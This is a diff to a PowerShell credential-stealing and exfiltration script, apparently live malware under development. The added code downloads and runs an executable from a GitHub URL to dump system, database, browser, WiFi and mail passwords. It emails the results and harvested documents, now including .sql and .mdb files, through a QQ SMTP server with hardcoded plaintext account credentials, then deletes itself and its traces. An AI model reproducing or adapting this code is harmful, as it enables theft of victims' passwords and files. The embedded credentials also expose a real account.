@@ -2750,9 +2750,38 @@ Dir -filter *.doc -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $cop
 Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
-Dir -filter *.sql -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 
-IEX (New-Object Net.WebClient).DownloadString('https://github.com/begiilm/dy/raw/master/GetPass.ps1');
+$huifu1 = (Get-ChildItem env:\username).value + ' GetPass.txt'
+$huifu2 = (Get-ChildItem env:\username).value + ' Report.zip'
+
+(new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/Get.rar','D:\Get.exe');
+(D:\Get.exe sysadmin & D:\Get.exe svn & D:\Get.exe database & D:\Get.exe browsers & D:\Get.exe wifi & D:\Get.exe mails) > D:\GetPass.txt
+$mail = New-Object System.Net.Mail.MailMessage
+#set the addresses
+$mail.From = New-Object System.Net.Mail.MailAddress('2014652020@email.ctbu.edu.cn','2014652020@email.ctbu.edu.cn')
+$mail.To.Add('2014652020@email.ctbu.edu.cn')
+#set the content
+$mail.Subject = $huifu1
+$mail.Priority  = 'High'
+$mail.Body = 'test'
+$filename= 'D:\GetPass.txt'
+$attachment = new-Object System.Net.Mail.Attachment($filename)
+$mail.Attachments.Add($attachment)
+#send the message
+$smtp = New-Object System.Net.Mail.SmtpClient -argumentList 'pop.exmail.qq.com'
+$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList '2014652020@email.ctbu.edu.cn','Inctbu123'
+$smtp.EnableSsl = 'True';
+$smtp.Timeout = '10000000';
+try{
+	$smtp.Send($mail)
+	echo 'Ok,Send succed!'
+}
+catch 
+{
+	echo 'Error!Filed!'
+}
+remove-item 'D:\GetPass.txt'
+remove-item 'D:\Get.exe'
 #(new-object System.Net.WebClient).DownloadFile('http://wpbkt.oss-cn-hangzhou.aliyuncs.com/GetPass.ps1','D:\GetPass.ps1');
 #D:\GetPass.ps1;
 $date = get-date
@@ -2841,7 +2870,7 @@ $Report = $Report + '</table></div>'
 
 $Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>'
 
-$Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.xls, *.xlsx, *.txt -Recurse |convertto-html Directory, Name, LastAccessTime)
+$Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.xls, *.xlsx, *.txt *.sql *.mdb  -Recurse |convertto-html Directory, Name, LastAccessTime)
 
 $Report = $Report + '</div>'
 
@@ -2906,10 +2935,10 @@ copy-ToZip($fileSaveDir)
 
 $mail = New-Object System.Net.Mail.MailMessage
 #set the addresses
-$mail.From = New-Object System.Net.Mail.MailAddress('2014111110@email.ctbu.edu.cn','2014111110@email.ctbu.edu.cn')
-$mail.To.Add('2014111110@email.ctbu.edu.cn')
+$mail.From = New-Object System.Net.Mail.MailAddress('2014652020@email.ctbu.edu.cn','2014652020@email.ctbu.edu.cn')
+$mail.To.Add('2014652020@email.ctbu.edu.cn')
 #set the content
-$mail.Subject = 'GetPass'
+$mail.Subject = $huifu2
 $mail.Priority  = 'High'
 $mail.Body = 'test'
 $filename= 'D:\Report.zip'
@@ -2917,7 +2946,7 @@ $attachment = new-Object System.Net.Mail.Attachment($filename)
 $mail.Attachments.Add($attachment)
 #send the message
 $smtp = New-Object System.Net.Mail.SmtpClient -argumentList 'pop.exmail.qq.com'
-$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList '2014111110@email.ctbu.edu.cn','Aictbu123'
+$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList '2014652020@email.ctbu.edu.cn','Inctbu123'
 $smtp.EnableSsl = 'True';
 $smtp.Timeout = '10000000';
 try{
@@ -2933,4 +2962,9 @@ remove-item $fileSaveDir -recurse
 remove-item 'D:\Report.zip'
 remove-item 'D:\runcmd.bat'
 Remove-Item $MyINvocation.InvocationName
-del -f D:Report.zip
+ping 127.1 -t 200 >nul
+remove-item 'D:\Report.zip'
+remove-item 'D:\runcmd.bat'
+Remove-Item $MyINvocation.InvocationName
+del -f D:\Report.zip
+
